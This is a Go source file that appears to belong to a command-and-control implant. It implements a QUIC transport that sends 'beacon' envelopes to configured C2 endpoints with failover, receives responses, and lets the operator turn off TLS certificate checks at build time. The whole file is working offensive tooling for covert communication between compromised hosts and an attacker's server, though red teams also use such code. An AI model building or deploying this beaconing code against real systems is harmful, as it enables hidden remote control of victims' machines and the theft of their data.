//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"time"

	"github.com/quic-go/quic-go"
)

const quicMaxBeacon = 16 * 1024 * 1024

// sendQUICBeacon ships one v2 envelope over a QUIC stream (TLS 1.3).
// The C2 URL is quic://host:port, and every configured quic:// endpoint is
// tried in failover order.
func sendQUICBeacon(body []byte) []byte {
	return forEachC2Endpoint("quic", func(_ int, _ string, hostPort, _ string) []byte {
		return sendQUICBeaconAt(hostPort, body)
	})
}

func sendQUICBeaconAt(hostPort string, body []byte) []byte {
	tlsCfg := newAgentTLSConfig("")
	if tlsCfg == nil {
		// #nosec G402 -- SkipTLSVerify is an operator build option; false runs the standard verifier.
		tlsCfg = &tls.Config{InsecureSkipVerify: SkipTLSVerify} // #nosec G402
	}
	tlsCfg.NextProtos = []string{"h3", "fc2"}
	// QUIC requires TLS 1.3.
	tlsCfg.MinVersion = tls.VersionTLS13

	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	conn, err := quic.DialAddr(ctx, hostPort, tlsCfg, &quic.Config{
		MaxIdleTimeout:  25 * time.Second,
		KeepAlivePeriod: 10 * time.Second,
	})
	if err != nil {
		if Debug {
			fmt.Printf("[!] QUIC beacon: dial %s failed: %v\n", hostPort, err)
		}
		return nil
	}
	defer func() { _ = conn.CloseWithError(0, "") }()

	stream, err := conn.OpenStreamSync(ctx)
	if err != nil {
		if Debug {
			fmt.Printf("[!] QUIC beacon: open stream failed: %v\n", err)
		}
		return nil
	}

	if _, err := stream.Write(body); err != nil {
		_ = stream.Close()
		if Debug {
			fmt.Printf("[!] QUIC beacon: write failed: %v\n", err)
		}
		return nil
	}
	// Half-close write so the server sees EOF on the request.
	_ = stream.Close()

	limited := io.LimitReader(stream, quicMaxBeacon+1)
	resp, err := io.ReadAll(limited)
	if err != nil {
		if Debug {
			fmt.Printf("[!] QUIC beacon: read failed: %v\n", err)
		}
		return nil
	}
	if len(resp) > quicMaxBeacon {
		if Debug {
			fmt.Printf("[!] QUIC beacon: response exceeds %d bytes\n", quicMaxBeacon)
		}
		return nil
	}
	if len(resp) == 0 {
		return nil
	}
	return resp
}
